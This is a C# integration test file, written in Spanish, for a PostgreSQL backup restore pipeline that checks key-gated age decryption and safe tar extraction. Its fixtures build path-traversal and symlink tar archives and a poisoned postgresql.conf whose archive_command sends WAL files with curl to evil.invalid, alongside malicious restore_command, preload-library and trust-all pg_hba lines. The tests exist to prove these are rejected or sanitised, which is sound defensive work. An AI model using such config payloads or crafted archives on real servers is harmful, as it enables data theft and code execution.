using System.Text;
using System.Text.RegularExpressions;
using BabelHub.IntegrationTests.VmAux;
using DotNet.Testcontainers.Builders;
using DotNet.Testcontainers.Containers;

namespace BabelHub.IntegrationTests.Respaldos;

/// <summary>
/// La restauración de ensayo en otra máquina solo con la copia fuera de línea (T28; PLA-17, AC-PLA-17): <c>scripts/descifrar-respaldo.sh</c>
/// descifra con la clave por la entrada estándar y solo si corresponde al destinatario registrado en la custodia, y
/// <c>scripts/extraer-respaldo.sh</c> valida el <c>tar</c> antes de extraer (sin rutas absolutas, <c>..</c>, enlaces peligrosos, archivos
/// especiales ni propietarios) y sanea lo que el respaldo trae (<c>postgresql.auto.conf</c>, <c>restore_command</c>, <c>archive_command</c>,
/// <c>pg_hba.conf</c>). La «otra máquina» es un contenedor aparte con GNU tar; la clave que descifra solo existe en la prueba.
/// </summary>
[Collection(RespaldosCollection.Nombre)]
public sealed class RestauracionDeEnsayoTests(RespaldosFixture entorno) : IAsyncLifetime
{
    private IContainer _maquina = null!;
    private string _custodia = string.Empty;

    private static string Raiz => EntornoDeVmAux.RaizDelRepositorio();

    public async Task InitializeAsync()
    {
        // La custodia real con el destinatario de esta ejecución registrado.
        var texto = File.ReadAllText(Path.Combine(Raiz, "infra", "respaldos", "custodia.md"));
        foreach (var (campo, valor) in new[]
        {
            ("Titular de la clave", "Titular de prueba"), ("Destinatario público (age)", entorno.Destinatario), ("Ubicación de la copia fuera de línea", "caja fuerte"),
            ("Ubicación de la segunda copia (obligatoria, en otro lugar)", "casa"), ("Última prueba de descifrado", "2026-01-01"),
        })
        {
            texto = Regex.Replace(texto, $@"(?m)^\| {Regex.Escape(campo)} \| .* \|$", _ => $"| {campo} | {valor} |", RegexOptions.None, TimeSpan.FromSeconds(2));
        }

        _custodia = texto;
        var builder = new ContainerBuilder(entorno.Etiqueta)
            .WithEntrypoint("sleep", "3600")
            .WithCreateParameterModifier(p => p.User = "root")
            .WithResourceMapping(Encoding.UTF8.GetBytes(_custodia), "/tmp/custodia.md");
        foreach (var script in new[] { "descifrar-respaldo.sh", "extraer-respaldo.sh" })
        {
            builder = builder.WithResourceMapping(File.ReadAllBytes(Path.Combine(Raiz, "scripts", script)), "/opt/scripts/" + script);
        }

        _maquina = builder.Build();
        await _maquina.StartAsync();
        var preparar = await _maquina.ExecAsync(["sh", "-c", "apk add --no-cache tar >/dev/null 2>&1; chmod 0755 /opt/scripts/*.sh; tar --version | head -n 1"]);
        Assert.Contains("GNU tar", preparar.Stdout, StringComparison.Ordinal);
    }

    public async Task DisposeAsync() => await _maquina.DisposeAsync();

    /// <summary>Ejecuta una orden de shell en la otra máquina como el usuario dado.</summary>
    private async Task<ExecResult> Como(string usuario, string orden) => await _maquina.ExecAsync(["su", "-s", "/bin/bash", usuario, "-c", orden]);

    private async Task<ExecResult> Root(string orden) => await _maquina.ExecAsync(["bash", "-c", orden]);

    private async Task<string> SubirRespaldo()
    {
        var respaldo = await entorno.PrimerRespaldo();
        var clave = respaldo.Diarios.Single(k => Regex.IsMatch(k, @"^\d{4}-\d{2}-\d{2}/\d{6}-[0-9a-f]{64}\.tar\.age$"));
        await _maquina.CopyAsync(await entorno.Descargar(RespaldosFixture.Diarios, clave), "/tmp/respaldo.tar.age");
        return "/tmp/respaldo.tar.age";
    }

    private string Identidad => entorno.Identidad;

    // ---------- Restauración de ensayo ----------

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task ConSoloLaCopiaFueraDeLinea_SeDescifraSeExtraeSeSaneaYSeRestauranLasDosBases()
    {
        var objeto = await SubirRespaldo();

        var flujo = await Como("postgres", $"printf '%s\\n' '{Identidad}' | /opt/scripts/descifrar-respaldo.sh --entrada {objeto} --custodia /tmp/custodia.md | /opt/scripts/extraer-respaldo.sh --destino /tmp/restaurada; echo \"codigos=${{PIPESTATUS[*]}}\"");

        Assert.Contains("codigos=0 0 0", flujo.Stdout, StringComparison.Ordinal);
        Assert.Contains("saneado", flujo.Stderr, StringComparison.Ordinal);
        var arranque = await Como("postgres", "pg_ctl -D /tmp/restaurada -o \"-c listen_addresses='' -c archive_mode=off\" -w -t 120 start >/tmp/pg.log 2>&1; echo $?");
        Assert.True(arranque.Stdout.Trim() == "0", (await Root("tail -n 30 /tmp/pg.log")).Stdout);
        foreach (var baseDeDatos in new[] { "ecommerce", "inventario" })
        {
            var consulta = await Como("postgres", $"psql -d {baseDeDatos} -tAc 'SELECT marca FROM datos'");
            Assert.Equal($"{entorno.MarcaDeDatos}-{baseDeDatos}", consulta.Stdout.Trim());
        }

        await Como("postgres", "pg_ctl -D /tmp/restaurada -m fast stop >/dev/null 2>&1");
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task ConUnaClaveQueNoCorrespondeAlDestinatarioRegistrado_NoSeDescifraNadaYSaleCon3()
    {
        var objeto = await SubirRespaldo();
        var otra = await Root("age-keygen 2>/dev/null | grep AGE-SECRET-KEY");

        var resultado = await Root($"printf '%s\\n' '{otra.Stdout.Trim()}' | /opt/scripts/descifrar-respaldo.sh --entrada {objeto} --custodia /tmp/custodia.md > /tmp/salida.bin; echo \"codigo=$? bytes=$(wc -c < /tmp/salida.bin)\"");

        Assert.Contains("codigo=3 bytes=0", resultado.Stdout, StringComparison.Ordinal);
        Assert.Contains("NO corresponde al destinatario registrado en la custodia", resultado.Stderr, StringComparison.Ordinal);
        Assert.DoesNotContain(otra.Stdout.Trim(), resultado.Stdout + resultado.Stderr, StringComparison.Ordinal);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task SiLaCustodiaNoRegistraElDestinatario_NoSeDescifra()
    {
        var objeto = await SubirRespaldo();
        await Root("sed -i 's/^| Destinatario público (age) | .* |$/| Destinatario público (age) | pendiente |/' /tmp/custodia.md");

        var resultado = await Root($"printf '%s\\n' '{Identidad}' | /opt/scripts/descifrar-respaldo.sh --entrada {objeto} --custodia /tmp/custodia.md > /tmp/salida.bin; echo \"codigo=$? bytes=$(wc -c < /tmp/salida.bin)\"");

        Assert.Contains("codigo=3 bytes=0", resultado.Stdout, StringComparison.Ordinal);
        Assert.Contains("la custodia no registra todavía el destinatario público", resultado.Stderr, StringComparison.Ordinal);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task ConLaClaveCorrecta_ElDescifradoNoEscribeElClaroEnDisco_YNoAceptaLaClaveComoArgumento()
    {
        var objeto = await SubirRespaldo();

        var sinClave = await Root($"/opt/scripts/descifrar-respaldo.sh --entrada {objeto} --custodia /tmp/custodia.md < /dev/null > /dev/null; echo codigo=$?");
        var conArgumento = await Root($"/opt/scripts/descifrar-respaldo.sh --entrada {objeto} --clave '{Identidad}' < /dev/null; echo codigo=$?");

        Assert.Contains("no es una clave privada de age", sinClave.Stderr, StringComparison.Ordinal);
        Assert.Contains("codigo=1", sinClave.Stdout, StringComparison.Ordinal);
        Assert.Contains("codigo=2", conArgumento.Stdout, StringComparison.Ordinal);
        Assert.DoesNotContain(Identidad, conArgumento.Stdout + conArgumento.Stderr, StringComparison.Ordinal);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task LaPruebaDeDescifrado_DescifraAlaNada_YRegistraLaFechaDeHoyEnLaCustodia()
    {
        var objeto = await SubirRespaldo();

        var resultado = await Root($"printf '%s\\n' '{Identidad}' | /opt/scripts/descifrar-respaldo.sh --entrada {objeto} --custodia /tmp/custodia.md --probar --registrar; echo codigo=$?");
        var custodia = await Root("cat /tmp/custodia.md");

        Assert.Contains("codigo=0", resultado.Stdout, StringComparison.Ordinal);
        Assert.Contains("Descifrado probado", resultado.Stderr, StringComparison.Ordinal);
        Assert.Contains($"| Última prueba de descifrado | {DateTime.UtcNow:yyyy-MM-dd} |", custodia.Stdout, StringComparison.Ordinal);
        Assert.DoesNotMatch(@"AGE-SECRET-KEY-[0-9A-Z]{10,}", custodia.Stdout);
        Assert.DoesNotContain("2026-01-01", custodia.Stdout, StringComparison.Ordinal);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task UnArchivoQueNoSeDescifraConLaClave_FallaConCodigo1()
    {
        await Root("echo 'esto no está cifrado' > /tmp/falso.age");

        var resultado = await Root($"printf '%s\\n' '{Identidad}' | /opt/scripts/descifrar-respaldo.sh --entrada /tmp/falso.age --custodia /tmp/custodia.md --probar; echo codigo=$?");

        Assert.Contains("codigo=1", resultado.Stdout, StringComparison.Ordinal);
        Assert.Contains("no se pudo descifrar", resultado.Stderr, StringComparison.Ordinal);
    }

    // ---------- Extracción segura ----------

    /// <summary>Arma un tar malicioso con la orden dada (en /tmp/trabajo) y lo extrae; devuelve el código y lo que apareció fuera de la carpeta.</summary>
    private async Task<(string Codigo, string Errores, string Destino, string Fuera)> Extraer(string armado)
    {
        var resultado = await Root("rm -rf /tmp/trabajo /tmp/destino /tmp/fuera /tmp/escape* && mkdir -p /tmp/trabajo /tmp/fuera && cd /tmp/trabajo && " + armado + " && /opt/scripts/extraer-respaldo.sh --destino /tmp/destino --tar /tmp/malo.tar; echo \"codigo=$?\"; echo \"destino=[$(ls -A /tmp/destino 2>/dev/null | tr '\\n' ' ')]\"; echo \"fuera=[$(ls -A /tmp/fuera | tr '\\n' ' ')$(ls -d /tmp/escape* /etc/escape* 2>/dev/null | tr '\\n' ' ')]\"");
        var codigo = Regex.Match(resultado.Stdout, @"codigo=(\d+)").Groups[1].Value;
        var destino = Regex.Match(resultado.Stdout, @"destino=\[(.*?)\]").Groups[1].Value;
        var fuera = Regex.Match(resultado.Stdout, @"fuera=\[(.*?)\]").Groups[1].Value;
        return (codigo, resultado.Stderr, destino, fuera);
    }

    [Theory]
    [InlineData("echo x > a.txt && tar -cPf /tmp/malo.tar --transform 's,^,/tmp/escape-abs/,' a.txt", "ruta absoluta")]
    [InlineData("echo x > a.txt && tar -cf /tmp/malo.tar --transform 's,^,../escape-pp/,' a.txt", "ruta con «..»")]
    [InlineData("echo x > a.txt && tar -cf /tmp/malo.tar --transform 's,^,x/../../escape-pp/,' a.txt", "ruta con «..»")]
    [InlineData("ln -s /etc enlace && tar -cf /tmp/malo.tar enlace", "enlace simbólico con destino absoluto")]
    [InlineData("ln -s ../../etc enlace && tar -cf /tmp/malo.tar enlace", "enlace simbólico con destino absoluto o con «..»")]
    [InlineData("echo x > a && ln a b && tar -cf /tmp/malo.tar a b", "enlace duro")]
    [InlineData("mkfifo tuberia && tar -cf /tmp/malo.tar tuberia", "entrada especial")]
    [InlineData("mknod dispositivo c 1 3 && tar -cf /tmp/malo.tar dispositivo", "entrada especial")]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task UnTarConEntradasPeligrosas_SeRechazaEnteroAntesDeExtraer_SinDejarNadaFueraNiDentro(string armado, string motivo)
    {
        var (codigo, errores, destino, fuera) = await Extraer(armado);

        Assert.Equal("1", codigo);
        Assert.Contains("Respaldo rechazado: ", errores, StringComparison.Ordinal);
        Assert.Contains(motivo, errores, StringComparison.Ordinal);
        Assert.Equal(string.Empty, destino);
        Assert.Equal(string.Empty, fuera);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task UnArchivoQueNoEsUnTar_SeRechaza()
    {
        var (codigo, errores, destino, _) = await Extraer("echo 'no soy un tar' > /tmp/malo.tar");

        Assert.Equal("1", codigo);
        Assert.Contains("no es un tar válido", errores, StringComparison.Ordinal);
        Assert.Equal(string.Empty, destino);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task ElTarSeExtraeSinPropietarios_AunqueEnElTarFueranDeOtroUsuario_YSaneaLoQueTraeElRespaldo()
    {
        const string Armado = """
            mkdir datos && cd datos
            printf '%s\n' "archive_mode = on" "archive_command = 'curl https://evil.invalid/%f'" "restore_command = 'cp /x/%f %p'" "primary_conninfo = 'host=evil.invalid'" "include 'ajeno.conf'" "INCLUDE_DIR 'otra'" "ARCHIVE_COMMAND = 'curl https://evil.invalid/MAYUS'" "Restore_Command = 'sh /evil'" "Shared_Preload_Libraries = './evil'" "dynamic_library_path = '.'" "ssl_passphrase_command = '/evil'" "shared_buffers = 128MB" "#archive_command = 'comentario original'" > postgresql.conf
            printf '%s\n' "archive_command = 'curl https://evil.invalid'" "restore_command = 'sh /evil'" > postgresql.auto.conf
            printf '%s\n' "host all all 0.0.0.0/0 trust" > pg_hba.conf
            echo "ident de otro" > pg_ident.conf
            echo standby > standby.signal
            echo recovery > recovery.signal
            echo 1234 > postmaster.pid
            echo 18 > PG_VERSION
            mkdir base && echo dato > base/1
            cd .. && tar -cf /tmp/malo.tar --owner=12345 --group=12345 -C datos .
            """;
        var armado = string.Join(" && ", Armado.ReplaceLineEndings("\n").Split('\n', StringSplitOptions.RemoveEmptyEntries).Select(l => l.Trim()));

        // Como root: sin --no-same-owner el tar restauraría el propietario 12345 del archivo.
        var (codigo, errores, destino, _) = await Extraer(armado);
        var propietario = await Root("stat -c '%u' /tmp/destino/PG_VERSION /tmp/destino/base/1 /tmp/destino/postgresql.conf | sort -u | tr '\\n' ' '");
        var modo = await Root("stat -c '%a' /tmp/destino /tmp/destino/postgresql.conf /tmp/destino/pg_hba.conf");
        var conf = (await Root("cat /tmp/destino/postgresql.conf")).Stdout;
        var auto = await Root("wc -c < /tmp/destino/postgresql.auto.conf");
        var hba = (await Root("cat /tmp/destino/pg_hba.conf")).Stdout;
        var ident = await Root("wc -c < /tmp/destino/pg_ident.conf");

        Assert.True(codigo == "0", errores);
        Assert.Contains("saneado", errores, StringComparison.Ordinal);
        Assert.Contains("PG_VERSION", destino, StringComparison.Ordinal);
        Assert.Equal("0", propietario.Stdout.Trim());
        Assert.Equal("700 600 600", string.Join(' ', modo.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)));
        Assert.Equal("0", auto.Stdout.Trim());
        Assert.Equal("0", ident.Stdout.Trim());
        Assert.Contains("Generado al restaurar", conf, StringComparison.Ordinal);
        Assert.Contains("listen_addresses = ''", conf, StringComparison.Ordinal);
        Assert.DoesNotContain("evil", conf, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("shared_buffers", conf, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotMatch(@"(?im)^\s*(archive_command|restore_command|primary_conninfo|include|include_dir|shared_preload_libraries|dynamic_library_path|ssl_passphrase_command)\b", conf);
        Assert.DoesNotContain("0.0.0.0", hba, StringComparison.Ordinal);
        Assert.DoesNotContain("trust", hba, StringComparison.Ordinal);
        Assert.Contains("scram-sha-256", hba, StringComparison.Ordinal);
        Assert.DoesNotContain("standby.signal", destino, StringComparison.Ordinal);
        Assert.DoesNotContain("recovery.signal", destino, StringComparison.Ordinal);
        Assert.DoesNotContain("postmaster.pid", destino, StringComparison.Ordinal);
    }

    [Fact]
    [Trait("Criterio", "AC-PLA-17")]
    public async Task SeExtraeSoloEnUnaCarpetaNuevaOVacia()
    {
        var resultado = await Root("mkdir -p /tmp/trabajo2 /tmp/ocupada && echo x > /tmp/trabajo2/a && tar -cf /tmp/ok.tar -C /tmp/trabajo2 . && echo y > /tmp/ocupada/archivo && /opt/scripts/extraer-respaldo.sh --destino /tmp/ocupada --tar /tmp/ok.tar; echo \"codigo=$? contenido=$(ls -A /tmp/ocupada)\"");

        Assert.Contains("codigo=2 contenido=archivo", resultado.Stdout, StringComparison.Ordinal);
        Assert.Contains("no está vacía", resultado.Stderr, StringComparison.Ordinal);
    }
}
